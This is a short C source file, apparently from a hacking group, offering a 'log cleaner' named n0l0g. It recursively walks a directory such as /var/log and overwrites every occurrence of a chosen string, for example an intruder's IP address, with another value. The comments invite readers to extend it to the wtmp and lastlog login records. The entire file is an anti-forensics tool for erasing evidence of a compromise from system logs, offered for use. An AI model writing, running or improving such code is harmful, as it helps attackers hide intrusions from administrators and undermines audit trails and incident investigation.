#include <stdio.h>
#include <dirent.h>

/* _____   _   _   _____        _____   _____       ___       ___  ___
/*|  _  \ | | | | /  ___/      |_   _| | ____|     /   |     /   |/   |
/*| | | | | |_| | | |___         | |   | |__      / /| |    / /|   /| |
/*| | | | |  _  | \___  \        | |   |  __|    / / | |   / / |__/ | |
/*| |_| | | | | |  ___| |        | |   | |___   / /  | |  / /       | |
/*|_____/ |_| |_| /_____/        |_|   |_____| /_/   |_| /_/        |_|
/**********************************************************************/
/* Exemple d'un log cleaner pas très avancé mais assez rapide. A vous */
/* de rajoutez des fonctions comme des fonctions specifiques pour les */
/* loggers comme wmtp, lastlog etc... http://www.dhs-team.org -b0l0k- */
/**********************************************************************/

int nb;
int main(int argc, char *argv[])
{
  nb = 0;
  printf("***********************************************\n");
  printf("*                n0l0g by b0l0k               *\n");
  printf("*           Log Cleaner of DHS-team           *\n");
  printf("*           http://www.dhs-team.org           *\n");
  printf("***********************************************\n");
  if (argc < 4)
  {
    printf("Usage: %s <dir or file> <search> <replace>\n", argv[0]);
    printf("Example: %s /var/log 80.66.66.66 80.55.55.55\n", argv[0]);
    return 0;
  }
  listdir(argv[1], argv[2], argv[3]);
  printf("%d occurence(s) supprimée(s)\n", nb);
  return 0;
}

int listdir(char *path, char *logged, char *replaced)
{
  char path_ent[1024];
  DIR *dir;
  struct dirent *ent;
  if ((dir = opendir(path)) == NULL)
  {
    logclean(path, logged, replaced);
    return -1;
  }
  while ((ent = readdir(dir)) != NULL)
  {
    memset(path_ent, 0, 1024);
    snprintf(path_ent, 1024, "%s/%s", path, ent->d_name);
    if (!strstr(path_ent, "/."))
    {
      if (opendir(path_ent))
        listdir(path_ent, logged, replaced);
      else
        logclean(path_ent, logged, replaced);
    }
  }
  return 0;
}

int logclean(char *path, char *logged, char *replaced)
{
  FILE *pFile;
  int sFile;
  int aLen;
  char *buffer;
  char *ptr;
  char *ptr2;

  pFile = fopen(path, "r+");
  if (pFile != NULL)
  {
    fseek(pFile, 0L, SEEK_END);
    sFile = ftell(pFile);
    buffer = malloc(sFile + 1);
    fseek(pFile, 0L, SEEK_SET);
    fread(buffer, sFile, 1, pFile);
    while ((ptr = strstr(buffer, logged)) != 0)
    {
      ptr2 = replaced;
      aLen = strlen(logged);
      for (aLen; aLen != 0; aLen--)
      {
        *ptr = *ptr2;
        ptr++;
        ptr2++;
      }
      nb++;
    }
    fseek(pFile, 0L, SEEK_SET);
    fwrite(buffer, 1, sFile, pFile);
    fclose(pFile);
  }
  else
    printf("Fichier ou dossier invalide : %s\n", path);
  return 0;
}
